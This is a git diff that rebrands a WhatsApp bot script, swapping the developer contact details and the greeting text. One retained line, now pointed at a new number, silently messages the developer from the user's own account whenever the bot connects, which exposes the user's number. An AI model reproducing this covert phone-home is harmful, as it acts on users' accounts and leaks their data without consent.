@@ -33,15 +33,15 @@ const starts = async (DogeXeonOP = new WAConnection()) => {
 		whitespaceBreak: false
 	}), 'cyan'))
 	console.log(color('\n> YT CHANNEL: Xeon ','silver'))
-console.log(color('> GITHUB: DGXeon ','silver'))
-console.log(color('> WA NUMBER: +916909137213 ','silver'))
+console.log(color('> GITHUB: Itsme-soman ','silver'))
+console.log(color('> WA NUMBER: +919961857267 ','silver'))
 console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
     console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
     console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
-    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/916909137213'))
+    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/919961857267'))
     console.log(color('[DOGE BOT]'), color('Doge Bot Is Online', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
-    console.log(color('<>','red'), color('Thanks For Using Doge Bot', 'white'))
+    console.log(color('<>','red'), color('Thanks For Using KICHU SER V2 Bot', 'white'))
 	DogeXeonOP.browserDescription = [ 'Subscribe Xeon', 'chrome', '3.0' ]
     DogeXeonOP.on('qr', () => {
         console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
@@ -55,7 +55,7 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
         success('2', 'Connected ✓')
     })
         //inform to developer that the user is connected to bot
-    DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    DogeXeonOP.sendMessage(`919961857267@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
     teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
@@ -103,7 +103,7 @@ DogeXeonOP.on("group-participants-update", async (anu) => {
       anu_user = v.vname || v.notify || num.split('@')[0]
       time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
       time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
-      teks = `   ⃟🐶⃟    𝙃𝙞 _*@${num.split('@')[0]}*_ \n   ⃟🐶⃟    𝘽𝙞𝙤 : _*${thu.status}*_ \n   ⃟🐶⃟    𝙈𝙚𝙢𝙗𝙚𝙧 : _*${memeg}*_ \n   ⃟🐶⃟    𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 _*${mdata.subject}*_\n   ⃟🐶⃟    𝘿𝙤𝙣𝙩 𝙁𝙤𝙧𝙜𝙚𝙩 𝙏𝙤 𝙍𝙚𝙖𝙙 𝘿𝙚𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣`
+      teks = `  👀    𝙃𝙞 _*@${num.split('@')[0]}*_ \n  👀    𝘽𝙞𝙤 : _*${thu.status}*_ \n  👀    𝙈𝙚𝙢𝙗𝙚𝙧 : _*${memeg}*_ \n  👀   𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 _*${mdata.subject}*_\n  👀    𝘿𝙤𝙣𝙩 𝙁𝙤𝙧𝙜𝙚𝙩 𝙏𝙤 𝙍𝙚𝙖𝙙 𝘿𝙚𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣`
       welcomeBut = [{buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'},type:1}, {buttonId:`#getdesc`,buttonText:{displayText:'READ DESC 📋'},type:1}]
       welcomeButt = { contentText: `${teks}`, footerText: `𝘿𝙤𝙜𝙚 𝘽𝙤𝙩`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
       DogeXeonOP.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
@@ -118,7 +118,7 @@ DogeXeonOP.on("group-participants-update", async (anu) => {
       time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
       time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
       memeg = mdata.participants.length
-      out = `   ⃟🐶⃟    𝙂𝙤𝙤𝙙𝙗𝙮𝙚 _*@${num.split('@')[0]}*_\n   ⃟🐶⃟    𝙃𝙤𝙥𝙚𝙛𝙪𝙡𝙡𝙮 𝙏𝙝𝙚𝙧𝙚 𝙒𝙤𝙣'𝙩 𝘽𝙚 𝘽𝙪𝙧𝙙𝙚𝙣 𝙃𝙚𝙧𝙚 𝘼𝙣𝙮𝙢𝙤𝙧𝙚`
+      out = `  👀    𝙂𝙤𝙤𝙙𝙗𝙮𝙚 _*@${num.split('@')[0]}*_\n  👀    𝙃𝙤𝙥𝙚𝙛𝙪𝙡𝙡𝙮 𝙏𝙝𝙚𝙧𝙚 𝙒𝙤𝙣'𝙩 𝘽𝙚 𝘽𝙪𝙧𝙙𝙚𝙣 𝙃𝙚𝙧𝙚 𝘼𝙣𝙮𝙢𝙤𝙧𝙚`
       goodbyeBut = [{buttonId:`#gbye`,buttonText:{displayText:'BYE 👋'},type:1}, {buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'}, type:1}]
       goodbyeButt = { contentText: `${out}`, footerText: `𝘿𝙤𝙜𝙚 𝘽𝙤𝙩`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
       DogeXeonOP.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
